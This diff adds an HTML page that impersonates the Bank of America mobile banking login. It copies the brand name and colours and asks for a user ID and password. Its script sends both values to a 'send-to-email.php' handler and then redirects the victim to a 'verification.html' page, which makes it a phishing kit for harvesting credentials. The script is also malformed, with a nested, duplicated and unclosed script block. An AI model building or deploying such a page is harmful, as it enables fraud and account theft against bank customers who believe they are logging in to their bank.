@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Bank of America - Log In</title>
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f0f0f0;
+      color: #333;
+    }
+
+    .header {
+      text-align: center;
+      padding: 20px 0;
+    }
+
+    .bank-logo {
+      color: #012169;
+      font-size: 24px;
+      font-weight: bold;
+    }
+
+    .mobile-login {
+      background-color: #E31837;
+      color: #FFFFFF;
+      text-align: center;
+      padding: 15px;
+      margin: 20px 0;
+      font-size: 18px;
+      font-weight: bold;
+    }
+
+    .container {
+      max-width: 400px;
+      margin: 30px auto;
+      background-color: #FFFFFF;
+      padding: 25px;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+    }
+
+    .login-box {
+      background-color: #f9f9f9;
+      border: 1px solid #ddd;
+      border-radius: 8px;
+      padding: 20px;
+    }
+
+    label {
+      display: block;
+      margin-top: 15px;
+      font-weight: bold;
+    }
+
+    input[type="text"],
+    input[type="password"] {
+      width: 100%;
+      padding: 10px;
+      margin: 10px 0;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+    }
+
+    button {
+      width: 100%;
+      padding: 10px;
+      background-color: #E31837;
+      color: #FFFFFF;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      font-weight: bold;
+      transition: background-color 0.3s ease;
+    }
+
+    button:hover {
+      background-color: #c41b37;
+    }
+
+    .footer {
+      text-align: center;
+      font-size: 12px;
+      color: #666;
+      margin-top: 20px;
+    }
+
+    .mobile-banking {
+      text-align: center;
+      margin-top: 20px;
+    }
+
+    .mobile-banking a {
+      color: #012169;
+      text-decoration: none;
+    }
+
+    .mobile-banking a:hover {
+      text-decoration: underline;
+    }
+
+    @media (max-width: 600px) {
+      .container {
+        padding: 20px;
+      }
+
+      .bank-logo {
+        font-size: 20px;
+      }
+
+      .mobile-login {
+        font-size: 16px;
+      }
+    }
+
+    @media (max-width: 400px) {
+      .container {
+        padding: 15px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="header">
+    <div class="bank-logo">Bank of America</div>
+  </div>
+
+  <div class="mobile-login">Log In to Mobile Banking</div>
+
+  <div class="container">
+    <div class="login-box">
+      <label for="userId">User ID</label>
+      <input type="text" id="userId" name="userId" placeholder="User ID" required>
+
+      <label for="password">Password</label>
+      <input type="password" id="password" name="password" placeholder="Password" required>
+
+      <button type="submit" onclick="submitForm()">Log In</button>
+    </div>
+  </div>
+
+  <div class="footer">
+    Having problems logging in or resetting your Password? If you're using a password manager or your browser has stored credentials that are no longer valid, deleting your stored credentials should enable you to access your account. Learn more
+  </div>
+
+  <div class="mobile-banking">
+    <p>Stay connected with our app</p>
+    <a href="#">Get the app</a>
+  </div>
+
+  <script>
+    function submitForm() {
+      const userId = document.getElementById("userId").value;
+      const password = document.getElementById("password").value;
+<script>
+function submitForm() {
+  const userId = document.getElementById("userId").value;
+  const password = document.getElementById("password").value;
+
+  // Send data to your PHP script
+  fetch("send-to-email.php", {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify({ userId, password })
+  });
+
+  // Redirect to verification page
+  window.location.href = "verification.html";
+}
+
+</body>
+</html>
